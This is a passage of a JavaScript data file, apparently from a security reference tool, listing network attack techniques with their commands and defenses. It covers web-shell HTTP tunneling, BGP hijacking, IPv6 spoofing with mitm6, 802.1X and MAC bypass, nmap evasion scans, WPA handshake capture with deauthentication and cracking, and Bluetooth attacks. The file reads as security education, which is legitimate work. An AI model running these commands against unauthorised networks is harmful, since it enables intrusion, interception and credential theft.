          "Large ICMP packets (normal Echo Request is 64 bytes; tunneled packets are much larger)",
          "High volume of ICMP traffic from a single host",
          "ICMP packets with unusual payload patterns (not standard ping data)",
          "Bidirectional ICMP traffic patterns (Echo Request AND Reply)"
        ],
        defense: [
          "Block ICMP at the firewall (may impact network diagnostics)",
          "Rate-limit ICMP traffic",
          "Deep packet inspection for ICMP payload anomalies",
          "Monitor ICMP packet sizes (flag packets > 128 bytes)"
        ]
      },
      {
        id: "NET-PIV-005",
        name: "HTTP Tunneling",
        description: "Encapsulating traffic within HTTP/HTTPS requests to bypass web-only proxy environments.",
        tools: [
          { name: "reGeorg / Neo-reGeorg", command: "Upload tunnel.aspx/php/jsp to web server; python neoreg.py -u http://target/tunnel.php -p socks5_port", description: "SOCKS proxy via web shell — tunnel through compromised web server" },
          { name: "Tunna", command: "Upload conn.php to server; python proxy.py -u http://target/conn.php -l 4444 -r 22 -a INTERNAL_IP", description: "HTTP tunnel for TCP connections through web server" },
          { name: "ABPTTS", command: "Upload abptts.aspx; python abpttsclient.py -c config -u http://target/abptts.aspx -f 127.0.0.1:3389/INTERNAL:3389", description: "TCP tunneling via HTTP/HTTPS — encrypted, supports authentication" }
        ]
      }
    ]
  },
  {
    category: "BGP Attacks",
    description: "Attacks targeting the Border Gateway Protocol — the routing protocol that holds the internet together.",
    techniques: [
      {
        id: "NET-BGP-001",
        name: "BGP Hijacking (Prefix Hijacking)",
        mitre: "T1599.001",
        description: "Announcing more specific IP prefixes or equally specific prefixes with shorter AS paths to divert traffic through an attacker's network.",
        mechanism: "BGP routers prefer more specific prefixes. If a legitimate AS announces 10.0.0.0/16, an attacker announcing 10.0.0.0/17 and 10.0.128.0/17 will attract all traffic for that range. Alternatively, announcing the same prefix with a shorter AS path achieves similar results.",
        realWorldExamples: [
          { date: "2018-04-24", description: "Amazon Route 53 hijack — attackers hijacked AWS DNS to steal cryptocurrency from MyEtherWallet users" },
          { date: "2022-01-07", description: "North Korea-linked group hijacked IP ranges from European/Asian ISPs to mine cryptocurrency" },
          { date: "2020-04-16", description: "Rostelecom (Russian ISP) briefly hijacked prefixes for Google, AWS, Cloudflare, and 200+ CDN/cloud providers" },
          { date: "2019-06-24", description: "China Telecom hijacked European mobile traffic through Chinese infrastructure for 2+ hours" }
        ],
        impact: [
          "Traffic interception — all traffic to hijacked prefixes passes through attacker",
          "Cryptocurrency theft via DNS hijacking",
          "Espionage — capture sensitive communications",
          "Denial of service — black hole traffic",
          "Man-in-the-middle — intercept, modify, and forward traffic"
        ],
        defense: [
          "RPKI (Resource Public Key Infrastructure) — cryptographic verification of route origin",
          "ROA (Route Origin Authorization) — published records of which AS is authorized to announce which prefix",
          "BGP monitoring services (RIPE RIS, BGPStream, BGPMon) — alert on unauthorized announcements",
          "Prefix filtering — reject BGP announcements for prefixes not in IRR (Internet Routing Registry)",
          "AS path filtering — reject routes with unexpected AS path lengths",
          "MANRS (Mutually Agreed Norms for Routing Security) compliance"
        ],
        difficulty: "hard",
        prerequisites: "Control of a BGP-speaking router with an upstream transit provider willing to propagate the announcement (or compromise of an ISP/IXP)"
      }
    ]
  },
  {
    category: "IPv6 Attacks",
    description: "Attacks specific to IPv6 networks, often exploiting the transition mechanisms and new features.",
    techniques: [
      {
        id: "NET-IPV6-001",
        name: "IPv6 Router Advertisement Spoofing",
        description: "Sending forged Router Advertisement (RA) messages to become the default IPv6 router for all hosts on the network segment.",
        mechanism: "IPv6 uses Stateless Address Autoconfiguration (SLAAC). Hosts listen for Router Advertisements to configure their IPv6 address and default gateway. By sending RAs with the attacker's address as the default router, all IPv6 traffic is redirected through the attacker.",
        tools: [
          { name: "THC-IPv6 toolkit", command: "fake_router6 eth0 2001:db8::/64", description: "Send fake RA messages to become default router" },
          { name: "Scapy", command: "sendp(Ether()/IPv6()/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix='2001:db8::',prefixlen=64))", description: "Craft custom RA packets" },
          { name: "mitm6", command: "mitm6 -d internal.domain", description: "IPv6 MITM attack specifically targeting Windows networks for NTLM relay" }
        ],
        impact: [
          "IPv6 MITM — intercept all IPv6 traffic",
          "DNS hijacking via RA-advertised DNS servers (RDNSS)",
          "WPAD injection for HTTP proxy interception",
          "NTLM hash capture via mitm6 + ntlmrelayx",
          "Works even on IPv4-only networks (Windows prefers IPv6 when available)"
        ],
        defense: [
          "RA Guard (RFC 6105) on managed switches — blocks RAs from unauthorized ports",
          "Disable IPv6 if not needed (controversial — may cause issues)",
          "DHCPv6 Guard — restrict DHCPv6 responses to authorized servers",
          "SEcure Neighbor Discovery (SEND) — cryptographic authentication of NDP messages",
          "Monitor for unexpected IPv6 traffic on IPv4-only networks"
        ],
        difficulty: "easy"
      },
      {
        id: "NET-IPV6-002",
        name: "IPv6 Neighbor Discovery Spoofing",
        description: "IPv6 equivalent of ARP spoofing — sending forged Neighbor Advertisement messages to redirect traffic.",
        mechanism: "IPv6 Neighbor Discovery Protocol (NDP) replaces ARP. Like ARP, NDP has no built-in authentication. Spoofed Neighbor Advertisement messages can map any IPv6 address to the attacker's MAC address.",
        tools: [
          { name: "parasite6", command: "parasite6 eth0", description: "ICMPv6 neighbor advertisement spoofer (like ARP spoofing for IPv6)" },
          { name: "THC-IPv6", command: "fake_advertise6 eth0 TARGET_IPV6 ATTACKER_MAC", description: "Send spoofed Neighbor Advertisement" }
        ],
        defense: [
          "SEND (Secure Neighbor Discovery) — RFC 3971",
          "RA Guard combined with ND Inspection",
          "Static neighbor cache entries for critical hosts",
          "Network monitoring for NDP anomalies"
        ],
        difficulty: "easy"
      }
    ]
  },
  {
    category: "Network Access Control Bypass",
    description: "Techniques for bypassing 802.1X, NAC, and other network access control mechanisms.",
    techniques: [
      {
        id: "NET-NAC-001",
        name: "802.1X Bypass via Hub/Tap",
        description: "Inserting a hub or network tap between an authenticated device and the switch port to piggyback on the authenticated session.",
        mechanism: "802.1X authenticates the port, not individual frames. Once a device authenticates, all frames on that port are allowed. By inserting a hub and spoofing the authenticated device's MAC address, the attacker gains network access.",
        tools: [
          { name: "Physical hub", command: "Connect hub between authenticated device and switch; connect attacker to hub", description: "Simple hardware interception" },
          { name: "macchanger", command: "macchanger -m AUTHENTICATED_DEVICE_MAC eth0", description: "Clone MAC address of authenticated device" },
          { name: "nac_bypass", command: "python nac_bypass.py -i eth0 -t TARGET_MAC", description: "Automated NAC bypass tool" }
        ],
        defense: [
          "MACSec (802.1AE) — encrypts Layer 2 frames, preventing unauthorized devices from reading/injecting traffic",
          "802.1X with dynamic VLAN assignment + MAC authentication",
          "Port security combined with 802.1X",
          "Continuous authentication (not just initial auth)",
          "Physical security of network drops"
        ],
        difficulty: "medium"
      },
      {
        id: "NET-NAC-002",
        name: "MAC Authentication Bypass (MAB) Exploitation",
        description: "Many NAC systems fall back to MAC Authentication Bypass when a device doesn't support 802.1X. Spoofing an authorized MAC address bypasses NAC.",
        mechanism: "The switch sends the connecting device's MAC address to the RADIUS server for authentication. If the MAC is in the authorized list (printers, IoT devices, phones), access is granted. Spoofing a known-authorized MAC grants the same access.",
        tools: [
          { name: "macchanger", command: "macchanger -m AA:BB:CC:DD:EE:FF eth0", description: "Spoof MAC to match authorized device" },
          { name: "Recon", command: "Sniff network for devices using MAB (they don't send 802.1X frames); identify their MACs via ARP or DHCP traffic", description: "Identify authorized MACs" }
        ],
        defense: [
          "Minimize MAB usage — deploy 802.1X on all capable devices",
          "Place MAB devices on restricted VLANs with limited access",
          "Profiling — validate device type matches expected profile for that MAC",
          "Certificate-based 802.1X where possible"
        ],
        difficulty: "easy"
      }
    ]
  }
];

// Network scanning reference
export const NETWORK_SCANNING = {
  portScanTypes: [
    { type: "TCP Connect (-sT)", description: "Full TCP 3-way handshake. Most reliable but most detectable.", command: "nmap -sT TARGET", detectable: "high" },
    { type: "SYN Scan (-sS)", description: "Half-open scan — sends SYN, receives SYN/ACK (open) or RST (closed), never completes handshake. Default for root.", command: "nmap -sS TARGET", detectable: "medium" },
    { type: "UDP Scan (-sU)", description: "Sends UDP packets. Open ports rarely respond; closed ports return ICMP Port Unreachable. Very slow.", command: "nmap -sU TARGET", detectable: "medium" },
    { type: "FIN Scan (-sF)", description: "Sends FIN flag. Open ports don't respond; closed ports send RST. Bypasses some firewalls.", command: "nmap -sF TARGET", detectable: "low" },
    { type: "NULL Scan (-sN)", description: "Sends no flags. Similar to FIN scan. Doesn't work against Windows (sends RST regardless).", command: "nmap -sN TARGET", detectable: "low" },
    { type: "Xmas Scan (-sX)", description: "Sends FIN+PSH+URG flags (Christmas tree pattern). Same behavior as FIN scan.", command: "nmap -sX TARGET", detectable: "low" },
    { type: "ACK Scan (-sA)", description: "Determines if ports are filtered (no response/ICMP error) or unfiltered (RST response). Maps firewall rules.", command: "nmap -sA TARGET", detectable: "medium" },
    { type: "Window Scan (-sW)", description: "Like ACK scan but examines TCP window size in RST to determine open/closed (OS-dependent).", command: "nmap -sW TARGET", detectable: "medium" },
    { type: "Idle Scan (-sI)", description: "Uses a zombie host's IP ID sequence to scan target without sending packets from your IP.", command: "nmap -sI ZOMBIE_IP TARGET", detectable: "very low" }
  ],
  nmapTiming: [
    { template: "T0 (Paranoid)", description: "5 minutes between probes. IDS evasion.", rateLimit: "Serial, 300s between probes" },
    { template: "T1 (Sneaky)", description: "15 seconds between probes. Slow IDS evasion.", rateLimit: "Serial, 15s between probes" },
    { template: "T2 (Polite)", description: "0.4 seconds between probes. Reduced network impact.", rateLimit: "Serial, 0.4s between probes" },
    { template: "T3 (Normal)", description: "Default timing template.", rateLimit: "Parallel, dynamic timing" },
    { template: "T4 (Aggressive)", description: "Faster scanning. May overwhelm slow networks.", rateLimit: "Max 10ms RTT timeout, 1250ms host timeout" },
    { template: "T5 (Insane)", description: "Maximum speed. Sacrifices accuracy for speed.", rateLimit: "Max 5ms RTT timeout, 300ms host timeout" }
  ],
  firewallEvasion: [
    { technique: "Fragment packets", command: "nmap -f TARGET", description: "Split probe packets into 8-byte IP fragments" },
    { technique: "MTU fragmentation", command: "nmap --mtu 24 TARGET", description: "Use specified MTU for fragmentation" },
    { technique: "Decoy scan", command: "nmap -D RND:10 TARGET", description: "Generate 10 random decoy IPs alongside real scan" },
    { technique: "Source port", command: "nmap --source-port 53 TARGET", description: "Use DNS source port (often allowed through firewalls)" },
    { technique: "MAC spoof", command: "nmap --spoof-mac Dell TARGET", description: "Spoof MAC address vendor prefix" },
    { technique: "Bad checksum", command: "nmap --badsum TARGET", description: "Send packets with bad checksums to detect firewall/IDS (they may process; hosts won't)" },
    { technique: "Data length", command: "nmap --data-length 50 TARGET", description: "Append random data to packets to avoid signature-based IDS" }
  ]
};

// Wireless network attacks
export const ADVANCED_WIRELESS_ATTACKS = {
  wpaAttacks: [
    {
      name: "PMKID Attack (Clientless)",
      description: "Capture PMKID from the AP's first EAPOL message without requiring a connected client or deauthentication attack.",
      command: "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1",
      cracking: "hcxpcapngtool capture.pcapng -o hash.22000; hashcat -m 22000 hash.22000 wordlist.txt",
      advantage: "No client needed, no deauth needed, captures quickly",
      discovered: "2018 by Jens Steube (hashcat developer)"
    },
    {
      name: "WPA2 4-Way Handshake Capture",
      description: "Capture the 4-way handshake between AP and client, then crack the PSK offline.",
      steps: [
        "Start monitor mode: airmon-ng start wlan0",
        "Scan for targets: airodump-ng wlan0mon",
        "Capture handshake: airodump-ng -c CHANNEL --bssid AP_BSSID -w capture wlan0mon",
        "Deauth client to force reconnection: aireplay-ng -0 5 -a AP_BSSID -c CLIENT_MAC wlan0mon",
        "Crack: aircrack-ng capture-01.cap -w wordlist.txt"
      ],
      tools: ["aircrack-ng suite", "hashcat (-m 22000)", "cowpatty", "pyrit"]
    },
    {
      name: "WPA3 Dragonblood Attacks",
      cve: "CVE-2019-9494, CVE-2019-9495, CVE-2019-9496, CVE-2019-9497",
      description: "Side-channel and downgrade attacks against WPA3's SAE (Simultaneous Authentication of Equals) handshake.",
      techniques: [
        "Timing-based side channel — leak information about the password from SAE handshake timing",
        "Cache-based side channel — exploit cache access patterns in SAE implementations",
        "Downgrade to WPA2 — force AP into WPA2/WPA3 transition mode",
        "Group downgrade — force weaker elliptic curve groups"
      ],
      defense: "Update AP firmware, use WPA3-only mode (not transition), implement constant-time SAE"
    },
    {
      name: "KRACK (Key Reinstallation Attacks)",
      cve: "CVE-2017-13077 through CVE-2017-13088",
      description: "Force nonce reuse in WPA2 4-way handshake by replaying message 3, allowing traffic decryption and injection.",
      impact: "Decrypt WPA2 traffic, inject packets (TCP hijacking, HTTP injection)",
      defense: "Patch client and AP firmware. Use HTTPS for all sensitive traffic."
    }
  ],
  bluetoothAttacks: [
    {
      name: "BlueBorne",
      cve: "CVE-2017-0781, CVE-2017-0782, CVE-2017-0783, CVE-2017-0785",
      description: "Remote code execution via Bluetooth without pairing — affects Android, iOS, Windows, Linux.",
      impact: "RCE without user interaction, worm-capable (spreads between nearby Bluetooth devices)",
      defense: "Patch OS, disable Bluetooth when not in use, use Bluetooth 5.0+"
    },
    {
      name: "KNOB (Key Negotiation of Bluetooth)",
      cve: "CVE-2019-9506",
      description: "Force Bluetooth encryption key length to 1 byte during negotiation, making brute-force trivial.",
      impact: "Decrypt all Bluetooth communication between paired devices",
      defense: "Minimum encryption key length enforcement in firmware"
    },
    {
      name: "BIAS (Bluetooth Impersonation Attacks)",
      cve: "CVE-2020-10135",
      description: "Exploit Bluetooth authentication to impersonate a previously paired device without knowing the long-term key.",
      impact: "Connect to any Bluetooth device as an already-trusted device",
      defense: "Bluetooth 5.1+ with Secure Connections Only mode"
    },
    {
      name: "BLE (Bluetooth Low Energy) Sniffing",
      tools: [
        { name: "Ubertooth One", command: "ubertooth-btle -f -c BLE_CHANNEL", description: "Hardware Bluetooth sniffer ($120 — capture BLE advertisements and connections" },
        { name: "nRF Sniffer", command: "Use with Wireshark nRF Sniffer plugin", description: "Nordic Semiconductor dongle for BLE sniffing" },
        { name: "GATTacker", command: "node ws-slave.js; node scan.js", description: "BLE MITM framework — clone a BLE device and intercept connections" }
      ],
      impact: "Intercept IoT device communications, smart lock credentials, fitness tracker data"
    }
  ]
};
